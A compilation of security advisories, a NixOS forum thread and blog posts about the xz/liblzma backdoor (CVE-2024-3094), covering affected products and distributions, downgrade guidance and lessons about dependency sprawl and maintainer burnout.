* FAS/AFF Baseboard Management Controller (BMC) - A320
* FAS/AFF Baseboard Management Controller (BMC) - A800/C800
* FAS/AFF Baseboard Management Controller (BMC) - A900/9500
* FAS/AFF Baseboard Management Controller (BMC) - C190/A150/A220/FAS2720/FAS2750
* FAS/AFF Baseboard Management Controller (BMC) - FAS2820
* FAS/AFF Service Processor - A300/8200/A200/2650/2620
* FAS/AFF Service Processor - A700/9000
* Global File Cache
* Host Utilities - SAN for Linux
* Host Utilities - SAN for Windows
* IOM12 SAS Disk Shelf Firmware
* IOM12B SAS Disk Shelf Firmware
* IOM12E SAS Disk Shelf Firmware
* IOM12F SAS Disk Shelf Firmware
* IOM12G SAS Disk Shelf Firmware
* IOM6 SAS Disk Shelf Firmware
* IOM6E SAS Disk Shelf Firmware
* Management Services for Element Software and NetApp HCI
* MetroCluster DataCollector
* MetroCluster Tiebreaker for clustered Data ONTAP
* Multipath I/O (SANtricity DSM for Windows MPIO)
* NetApp BlueXP
* NetApp Converged Systems Advisor Agent
* NetApp E-Series Host Collection
* NetApp E-Series SANtricity Collection
* NetApp HCI Baseboard Management Controller (BMC) - H300S/H500S/H700S/H410S
* NetApp HCI Baseboard Management Controller (BMC) - H410C
* NetApp HCI Baseboard Management Controller (BMC) - H610C
* NetApp HCI Baseboard Management Controller (BMC) - H610S
* NetApp HCI Baseboard Management Controller (BMC) - H615C
* NetApp HCI Compute Node (Bootstrap OS)
* NetApp HCI Compute Node BIOS
* NetApp HCI Storage Node BIOS
* NetApp Kubernetes Monitoring Operator
* NetApp Manageability SDK
* NetApp NFS Plug-in for VMware VAAI
* NetApp ONTAP PowerShell Toolkit (PSTK)
* NetApp SolidFire & HCI Management Node
* NetApp SolidFire & HCI Storage Node (Element Software)
* NetApp SolidFire Plug-in for vRealize Orchestrator (SolidFire vRO)
* NetApp XCP NFS
* NetApp XCP SMB
* ONTAP 9 (formerly Clustered Data ONTAP)
* ONTAP Antivirus Connector
* ONTAP Mediator
* ONTAP Select Deploy administration utility
* ONTAP tools for VMware vSphere 10
* ONTAP tools for VMware vSphere 9
* OnCommand Insight
* OnCommand Workflow Automation
* RcfFileGenerator for MetroCluster IP
* SANtricity Storage Plugin for vCenter
* SRA Plugin for Linux
* SRA Plugin for Windows
* Single Mailbox Recovery
* Snap Creator Framework
* SnapCenter
* SnapCenter Plug-in for VMware vSphere/BlueXP backup and Recovery for Virtual Machine
* SnapGathers
* SnapManager for Hyper-V
* SolidFire Storage Replication Adapter
* StorageGRID (formerly StorageGRID Webscale)
* StorageGRID BIOS SG1000/SG100/SG1100/SG110
* StorageGRID BIOS SG5660/SG5612/SG5760/SG5712
* StorageGRID BIOS SG6060/SGF6024/SGF6112/SG6160
* StorageGRID Baseboard Management Controller (BMC) - SG6060/SG6160/SGF6024/SGF6112/SG100/SG110/SG1000/SG1100
* System Manager 9.x
* Terraform Provider for ONTAP

Remediation
#### Software Versions and Fixes

None.

This section will be updated as patches are released.

#### Workarounds

None at this time.

#### Obtaining Software Fixes

Software fixes will be made available through the NetApp Support website in the Software Download section.

<https://mysupport.netapp.com/site/downloads/>

Customers who do not have access to the Support website should contact Technical Support at the number below to obtain the patches.

#### Contact Information

Check <http://mysupport.netapp.com> for further
updates.

For questions, contact NetApp at:

**Technical Support**

mysupport.netapp.com

1 888 4 NETAPP (1 888 463 8277) (U.S. and Canada)

+00 800 44 638277 (EMEA/Europe)

+800 800 80 800 (Asia/Pacific)

Revision History
#### Status of This Notice

**Final.**

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

This advisory is posted at the following link:

<https://security.netapp.com/advisory/NTAP-20240402-0001>
#### Revision History

| **Revision #** | **Date** | **Comments** |
| --- | --- | --- |
| 1.0 | 20240402 | Initial Public Release |
| 2.0 | 20240405 | Element .NET SDK, Element JAVA SDK, Element Python SDK, Element Powershell Tools, and Cloud Insights Storage Workload Security Agent moved to Products Not Affected |
| 3.0 | 20240411 | Active IQ Unified Manager for VMware vSphere, Cloud Volumes ONTAP Mediator, ONTAP Select Deploy administration utility, moved to Products Not Affected |
| 4.0 | 20240416 | ONTAP tools for VMware vSphere 9 moved to Products Not Affected |
| 5.0 | 20240425 | NetApp SolidFire & HCI Management Node moved to Products Not Affected |
| 6.0 | 20240508 | ONTAP tools for VMware vSphere 10 moved to Products Not Affected |
| 7.0 | 20240515 | SnapCenter moved to Products Not Affected |
| 8.0 | 20240603 | SnapCenter Plug-in for VMware vSphere/BlueXP backup and Recovery for Virtual Machine moved to Products Not Affected, Final status |

This document is provided solely for informational purposes. All information is based upon NetAppâs current knowledge and understanding of the hardware and software products tested by NetApp, and the methodology and assumptions used by NetApp. NetApp is not responsible for any errors or omissions that may be contained herein, and no warranty, representation, or other legal commitment or obligation is being provided by NetApp. Â© 2025 NetApp, Inc. All rights reserved. No portions of this document may be reproduced without prior written consent of NetApp, Inc.

 ©  NetApp

Have feedback for our website?
[Let us know](https://www.netapp.com/forms/site-feedback/)



=== Content from discourse.nixos.org_cde265e3_20250111_034013.html ===


![NixOS Discourse](data:image/svg;base64...)
Loading

[NixOS Discourse](/)

# [CVE-2024-3094: Malicious code in xz 5.6.0 and 5.6.1 tarballs](/t/cve-2024-3094-malicious-code-in-xz-5-6-0-and-5-6-1-tarballs/42405)

[Announcements](/c/announcements/security/56)

[Security](/c/announcements/security/56)

[hexa](https://discourse.nixos.org/u/hexa)

March 29, 2024, 8:39pm

1

There is currently an ongoing discussion on various platforms about a security issue in `xz`/`liblzma`, and here is what we know at this time. This post serves as a way to inform the community about our assessment of the impact on nixpkgs.

## Summary

It was discovered that xz from version 5.6.0 started shipping malicious code that would only be executed through its release tarballs. A malicious code path would be executed when running `configure` and modify the resulting `liblzma` library.

## Impact

NixOS 23.11 is **unaffected** since it ships with xz 5.4.4.

NixOS Unstable currently ships with xz 5.6.1 but is **unaffected**, since the malicious code path exits early, and **liblzma remains unpatched**.

## Workaround

none

## Resolution

The security team and other stakeholders agreed that [downgrading xz to 5.4.6](https://github.com/NixOS/nixpkgs/pull/300028) for NixOS Unstable was the safest choice for now. The downgrade needs to pass through staging-next, which will likely require another 10 days.

## References

* [PR progress tracker](https://nixpk.gs/pr-tracker.html?pr=300028)
* [FAQ on the xz-utils backdoor](https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27)
* [oss-security - backdoor in upstream xz/liblzma leading to ssh server compromise](https://www.openwall.com/lists/oss-security/2024/03/29/4)

66 Likes

[fabianh](https://discourse.nixos.org/u/fabianh)

March 29, 2024, 9:00pm

3

For those that waiting for the downgrade is not within their risk tolerance, ~~another option would be to rollback your nix stuff to the last nixpkgs revision before 5.6.0 / 5.6.1 versions~~

~~That can be checked on the following links:
- https://hydra.nixos.org/job/nixpkgs/trunk/xz.x86\_64-linux (nixpkgs), and
- https://hydra.nixos.org/job/nixos/trunk-combined/nixpkgs.xz.x86\_64-linux (NixOS)~~
~~Last evals before xz 5.6.x are
- Nixpkgs: https://hydra.nixos.org/build/250936654 (input nixpks revision `9a9dae8f6319600fa9aebde37f340975cab4b8c0`)
- NixOS: https://hydra.nixos.org/build/250820195 (input nixpkgs revision `73de017ef2d18a04ac4bfd0c02650007ccb31c2a`)~~
~~Disclaimer: Those are 1 month old and depending on the circumstances rolling back to such a version might be worse. Your mileage may vary.~~

A good part of packages have been built on the staging-next branch after the xz downgrade; it has the following rev: `d6dc19adbda4fd92fe9a332327a8113eaa843894` ( from <https://hydra.nixos.org/eval/1805322#tabs-inputs> )

3 Likes

[redshift](https://discourse.nixos.org/u/redshift)

March 29, 2024, 9:07pm

4

![](https://discourse.nixos.org/user_avatar/discourse.nixos.org/hexa/48/1300_2.png) hexa:
> The downgrade needs to pass through staging-next, which will likely require another 10 days.

Is there a way to move updates to the head of the queue, for security events?

5 Likes

[hexa](https://discourse.nixos.org/u/hexa)

March 29, 2024, 9:08pm

5

This is currently at the head of the queue, but since xz causes a stdenv rebuild on all four supported platforms, we are talking about a 220,000 packages in the queue that need to be built.

10 Likes

[domenkozar](https://discourse.nixos.org/u/domenkozar)

March 29, 2024, 9:39pm

6

I’ve looked into this briefly and it doesn’t seem Nixpkgs is affected at all, since we use github tarballs malicious code didn’t get in.

3 Likes

[hexa](https://discourse.nixos.org/u/hexa)

March 29, 2024, 9:40pm

7

Note that the malicious code is in the test artifacts, the known execution vector currently only has been found in the bespoke tarballs they publish from their website.

[Roger](https://discourse.nixos.org/u/Roger)

March 29, 2024, 10:02pm

8

I think that’s not the case, the ones generated by github are not affected (the Source ones), the release artifacts published on the release page are affected and [it looks like it’s what nixpkgs is using](https://github.com/NixOS/nixpkgs/blob/3cd1103ccd12d1d6adbdf15cdc864a953e30472d/pkgs/tools/compression/xz/default.nix#L17). Their website just links to github releases.

4 Likes

[claes](https://discourse.nixos.org/u/claes)

March 29, 2024, 10:04pm

9

When I look at [XZ Utils](https://xz.tukaani.org/xz-utils/) the tarballs linked from there are from Github. My understanding from the writeup on [xz-utils backdoor situation · GitHub](https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27) is that the tarball contents do not correspond to the Github git repository contents.

1 Like

[ElvishJerricco](https://discourse.nixos.org/u/ElvishJerricco)

March 29, 2024, 10:16pm

10

To what degree was nixpkgs affected by this? My understanding is that the backdoor was only injected to rpm and deb builds, which nixpkgs doesn’t use. Is that merely conjecture at the moment?

[tgerbet](https://discourse.nixos.org/u/tgerbet)

March 29, 2024, 10:26pm

11

It’s a bit more subtle than that because part of the chain is present in the Git repository in “fake” test fixtures: [Tests: Update two test files. · tukaani-project/xz@6e63681 · GitHub](https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89)

The issue can only be triggered when using the official release tarball because it requires a change to a Makefile that is not present in the Git repository.

To the **current knowledge** of the community for packages using the `xz` nixpkgs package:

* even with the backdoored tarball the script injecting the backdoor does not work in our build context. Basically the script injecting the backdoor runs but it exits without doing anything because the required conditions do not match: the backdoor is not injected in the built binaries
* the backdoor itself has a certain number of conditions that are not met in a NixOS environment and as such is not effective

Note that the situation is evolving and more knowledge is being acquired thanks to people looking more closely to the backdoor itself but if you rollback to a nixpkgs unstable pin from before the upgrade to `xz` 5.6.x you need to consider, according to your threat model, that other security issues have been fixed in the meantime.

9 Likes

[rnhmjoj](https://discourse.nixos.org/u/rnhmjoj)

March 29, 2024, 10:47pm

12

Note: the same guy also made some suspicious “contributions” to libarchive:

[github.com/libarchive/libarchive](https://github.com/libarchive/libarchive/pull/1609/files)

#### [Added error text to warning when untaring with bsdtar](https://github.com/libarchive/libarchive/pull/1609/files)

`libarchive:master` ← `JiaT75:added_error_message_to_warning_bsdtar_1561`

opened 02:55PM - 02 Nov 21 UTC

[![JiaT75](https://discourse.nixos.org/uploads/default/original/3X/d/0/d097551ce1a7b6c582097ba993ec4d41f09775be.png)
JiaT75](https://github.com/JiaT75)

[+3
-4](https://github.com/libarchive/libarchive/pull/1609/files)

Added the error text when printing out warning and errors in bsdtar when untarin[…](https://github.com/libarchive/libarchive/pull/1609)g. Previously, there were cryptic error messages when, for example in issue #1561, the user tries to untar an archive in a location they do not have write access to.
closes #1561

I would `git revert` every single one of these, just in case.

I checked their entire github log and, fortunately, it looks like only libarchive and xz are affected.

6 Likes

[anticipatedfart](https://discourse.nixos.org/u/anticipatedfart)

March 29, 2024, 11:20pm

13

Skimming through the [linked FAQ](https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27) I found this:

> The payload only activates if the running program has the process name `/usr/bin/sshd`.

… so I guess that’s good for NixOS users, right?

1 Like

[anund](https://discourse.nixos.org/u/anund)

March 30, 2024, 12:21am

14

`/usr/bin/sshd` might show up for things using [buildFHSEnv | nixpkgs](https://ryantm.github.io/nixpkgs/builders/special/fhs-environments/#sec-fhs-environments). `steam`, for example, includes `xz` but no copy of `sshd`.

2 Likes

[PerfMonk](https://discourse.nixos.org/u/PerfMonk)

March 30, 2024, 12:30am

15

10 days for a high security risk , Can we do better ?

OpenMandriva has already taken out the corrupted code and is distributing xz 5.6.1-2 to their users …

![](https://discourse.nixos.org/uploads/default/original/3X/2/c/2cb113233c8c3027e63eea80401ee9e7f519e408.png)
[OpenMandriva forum – 29 Mar 24](https://forum.openmandriva.org/t/backdoor-in-xz-might-affect-cooker-and-rolling-users-update-as-soon-as-possible/5237 "06:38PM - 29 March 2024")

![](https://discourse.nixos.org/uploads/default/original/3X/4/a/4aa70475d2d0719cc2b7004a6a21efe17cb10c7c.png)
### [Backdoor in xz might affect cooker and rolling users. Update as soon as...](https://forum.openmandriva.org/t/backdoor-in-xz-might-affect-cooker-and-rolling-users-update-as-soon-as-possible/5237)

Announcements and Communications

A backdoor in liblzma, part of the xz compressor 5.6.x has been discovered. The exact workings of the backdoor are not yet known; it is, however, clear that it targets OpenSSH servers and hijacks their authentication. While the cooker and rolling...

1 Like

[PaulGrandperrin](https://discourse.nixos.org/u/PaulGrandperrin)

March 30, 2024, 12:34am

16

Debian is considering going back two years, before Jia Tan started committing to the project: <https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1068024>

4 Likes

[PaulGrandperrin](https://discourse.nixos.org/u/PaulGrandperrin)

March 30, 2024, 12:36am

17

Maybe `system.replaceRuntimeDependencies` can help.

4 Likes

[AndersonTorres](https://discourse.nixos.org/u/AndersonTorres)

March 30, 2024, 6:27am

18

Given that [the XZ repo was nuked](https://github.com/tukaani-project/xz), what should we do?

1 Like

[vcunat](https://discourse.nixos.org/u/vcunat)

March 30, 2024, 7:09am

19

I don’t see that as really impeding stuff around NixOS / NixPkgs. It already downloads from a mirror.

[rnhmjoj](https://discourse.nixos.org/u/rnhmjoj)

March 30, 2024, 8:32am

20

There’s not much we can do, it’s a downside of how Nix handles package dependencies. You can’t simply swap out one core package without rebuilding everything that depends on it, otherwise the resulting packages won’t pure.

If you’re on NixOS you can use `system.replaceRuntimeDependencies` to rewrite all the references to the infected xz, until the revert commit reaches the unstable channel.

6 Likes

**[next page →](/t/cve-2024-3094-malicious-code-in-xz-5-6-0-and-5-6-1-tarballs/42405?page=2)**

* [Home](/)
* [Categories](/categories)
* [Guidelines](/guidelines)
* [Terms of Service](/tos)
* [Privacy Policy](/privacy)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



=== Content from ariadne.space_301bb81d_20250111_034003.html ===

[![](/images/me.jpg)
# Ariadne Conill](https://ariadne.space)
Free software developer and internet jackalope
extraordinaire

* [About](/about/ "About")

#### Elsewhere

* [Gitea (local)](https://gitea.treehouse.systems/ariadne)
* [Fediverse](https://social.treehouse.systems/%40ariadne)
* [GitHub](https://github.com/kaniini)
* [Alpine Gitlab](https://gitlab.alpinelinux.org/ariadne)
* [Twitter](https://twitter.com/ariadneconill)
* [LinkedIn](https://www.linkedin.com/in/ariadneconill/)

[# The XZ Utils backdoor is a symptom of a larger problem

Apr 2, 2024](https://ariadne.space/2024/04/02/the-xz-utils-backdoor-is-a-symptom-of-a-larger-problem/)

On March 29th, Andres Freund [dropped a bombshell on the oss-security mailing list](https://www.openwall.com/lists/oss-security/2024/03/29/4): recent XZ Utils source code tarball releases made by Jia Tan were released with a backdoor.
Thankfully, for multiple reasons, [Alpine was not impacted by this backdoor](https://alpinelinux.org/posts/XZ-backdoor-CVE-2024-3094.html), despite the recent source code tarball releases being published in Alpine `edge`.
But what lessons do we need to learn from this incident?

## The software “supply chain” is not real

As a community of hackers, we have built an exhaustive commons of free software released under various free licenses such as the GPL and the Apache 2.0 license.
Software packages in this commons have taken over the corporate world, because it enabled more rapid innovation by allowing developers to focus more on the business logic of their applications, rather than low-level details.
This has been overall a good thing for society: from the open commons we have spawned a whole world of applications which have become the foundational bedrock of modern society.
It can certainly be argued that the invention of FOSS licensing models has been as revolutionary for the digital economy as the steam engine was for industry.

There is one problem, however – when we take software from the commons, we are like raccoons digging through a dumpster to find something useful.
There is no “supply chain” in reality, *but* there is an effort by corporations which consume software from the commons to pretend there is one in order to shift the obligations related to ingesting third-party code away from themselves and to the original authors and maintainers of the code they are using.

For there to be a “supply chain”, there must be a supplier, which in return requires a contractual relationship between two parties.
With software licensed under FOSS licensing terms, a consumer receives a non-exclusive license to make use of the software however they wish (in accordance with the license requirements, of course), but non-exclusive licenses cannot and do not imply a contractual supplier-consumer relationship.

With that said, many of the proposals made by people working to improve security of the software “supply chain” have practical and valuable uses for protecting the integrity of the commons, and are worthy of further examination.

## “Junk drawer” libraries are valuable targets

CVE-2024-3094 happened for a simple reason: [distributions patching OpenSSH to support systemd’s readiness notifications](https://bugs.debian.org/778913).

Frequently, authors looking to add systemd readiness notifications to their software tend to just look for the `systemd` pkg-config package, and use its `CFLAGS` and `LIBS`.
This results in the software linking to `libsystemd`.
What does *that* have to do with anything, after all we are talking about a backdoor in `liblzma`, not `libsystemd`?
Simple: although `sd_daemon()` does not make use of any functionality in `liblzma`, because `libsystemd` has a `DT_DEPEND` entry against `liblzma`, it will pull in `liblzma` as a shared object dependency.
Once that happens, the *constructor* functions in `liblzma` will run, as it is being loaded due to being in the dependency graph.

What can be done about this?
A simple solution would be to start to split up the various `libsystemd` routines into smaller packages.
This would allow for these packages to link against `libsystemd-daemon` or similar instead, which would presumably not link against `liblzma`, as it is unnecessary for readiness notifications.
The `systemd` pkg-config package could be kept around as a metapackage pulling in the other libraries as a migration path.

I call libraries which are large amalgamations of unrelated routines “junk drawer” libraries because they are basically the programming equivalent to a junk drawer: routines and dependencies accumulate over years and suddenly you have a mess of programs which depend on this library but only use some small portion of the library.
As these unnecessary dependencies accumulate, these “junk drawer” libraries become valuable points of interest when scouting for projects to compromise.
I would recommend auditing any of the other dependencies of systemd for possible backdoors for this reason.
There are a number of other libraries which could have been targeted in this way as well, which are also in the libsystemd dependency graph, such as PCRE.

## Be kind to software maintainers

Although I am not certain that this lesson is particularly applicable to the xz-utils situation, since the actor who implemented the backdoor most likely made use of sockpuppet personas to advocate for his becoming a maintainer, the mental health of software maintainers is important.

Directly what this means is that if you see somebody harassing a maintainer with specific demands, you should not join in on the thread.
Let the maintainer deal with it publicly, and reach out privately if you are concerned about the situation.
Otherwise, even if you are concerned about burnout or the maintainer overworking, you may wind up advocating for a threat actor to become a maintainer of something.



=== Content from twitter.com_0ac44338_20250111_034039.html ===



=== Content from xeiaso.net_5d2fee29_20250111_034046.html ===


[Xe](/)

[Blog](/blog/)

[Contact](/contact/)

[Resume](/resume/)

[Talks](/talks/)

[Xecast](/xecast/)

[Signalboost](/signalboost/)

# liblzma and xz version 5.6.0 and 5.6.1 are vulnerable to arbitrary code execution compromise

Published on 03/29/2024, 425 words, 2 minutes to read

![An image of A stop sign on a blue sky with the words 'security alert' underneath it](https://cdn.xeiaso.net/file/christine-static/hero/xz-alert.jpg)
A stop sign on a blue sky with the words 'security alert' underneath it - Photo by Xe Iaso, EOS R10 with 135mm Super-Multi-Coated Takumar f/3.5

UPDATE(M03-29-2024 13:43-EDT): This is [CVE-2024-3094](https://nvd.nist.gov/vuln/detail/CVE-2024-3094).

This is a new situation and we are still gathering information. Here is what we know so far:

The [xz/liblzma project](https://github.com/tukaani-project/xz) has released versions 5.6.0 and 5.6.1.

The combination of this and patches made by some distributions to the interactions between liblzma, libsystemd, and sshd have resulted in a situation where an attacker can compromise a system by sending a malicious payload to an sshd server.

We are lucky. This only affects AMD64 Linux systems. Currently, incomplete analysis of the vulnerability suggests that this only targets a specific RSA function used in sshd. The exploit is in the wild. This is also a very new version of xz/liblzma, so it is not widely deployed yet. This is also unlikely to affect anything other than Glibc (because of glibc IFUNC support), so if you use [musl](https://musl.libc.org/) or another libc implementation, you are likely safe.

If you are using a distribution that has not yet released xz 5.6.0 or 5.6.1, you are likely safe.

If you are running Debian sid, Fedora 40, Fedora Rawhide, openSUSE Tumbleweed, or openSUSE MicroOS, run updates now.

Here are the distros where it is likely to be released (according to [repology](https://repology.org/project/xz/versions)):

* Alpine Edge
* Arch
* Cygwin
* Exherbo
* Gentoo
* Homebrew
* KaOS
* MacPorts
* Manjaro Testing
* NixOS Unstable/nixpkgs unstable
* OpenIndiana
* OpenMamba
* OpenMandriva Rolling
* Parabola
* PCLinuxOS
* Pisi Linux
* pkgsrc current
* Ravenports
* Slackware current
* Solus
* Termux
* Wikidata

If you are using one of these distributions, you should check to see if you are using xz version 5.6.0 or 5.6.1. If you are, you should downgrade to 5.4.6. If you can't downgrade, you should disable public-facing SSH servers until you can downgrade.

At this time, we believe that version 5.4.6 is not vulnerable to this exploit. If you are using a different version, you should check with your distribution's security mailing list to see if you are vulnerable. If you are not already subscribed to your distribution's security mailing list, you should do so now.

Here is how you can tell if you're running the affected version:

```
xz --version

```

Here is what the output on the vulnerable version looks like:

```
$ xz --version
xz (XZ Utils) 5.6.1
liblzma 5.6.1

```

Stay tuned for more information. [Red Hat's security advisory](https://www.redhat.com/en/blog/urgent-security-alert-fedora-41-and-rawhide-users) may be helpful.

---

Special thanks to titanous for pre-vetting this before it went live.

---

 Share

Facts and circumstances may have changed since publication. Please contact me before jumping to conclusions if something seems wrong or unclear.

Tags:

Copyright 2012-2025 Xe Iaso. Any and all opinions listed here are my own and
not representative of any of my employers, past, future, and/or present.

Like what you see? Donate on [Patreon](https://patreon.com/cadey) like [these awesome people](/patrons)!

Served by xesite v4 (/app/xesite) with site version
[e84fe911](https://github.com/Xe/site/commit/e84fe91132dbe75e6f2e8cdb4aa956e0a69f91cd)
, source code available [here](https://github.com/Xe/site).


